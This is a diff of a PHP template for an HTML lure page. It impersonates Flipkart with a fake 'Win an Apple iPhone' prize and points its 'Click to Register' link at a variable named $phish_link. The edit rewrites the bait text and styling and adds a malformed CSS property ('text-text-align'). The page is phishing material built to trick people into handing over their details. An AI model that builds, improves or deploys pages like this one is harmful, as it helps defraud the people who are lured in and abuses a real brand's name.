@@ -21,16 +21,13 @@ return <<<l
 <title>Flipkart</title>
 </head>
 <body>
-    <h2>Win Apple</h2>
-    <hr>
-    <h3>1. Visit this page on your phone</h3>
-    <h3>2. Visit below link</h3>
-    <a href="$phish_link">Register</a>
+    <h2>Win an Apple iPhone</h2>
+    <a href="$phish_link">Click to Register</a>
     <style>
         body{
             font-family:Arial;
             background: #ccc;
-            margin:0;
+            text-text-align: center;
         }
     </style>
 </body>
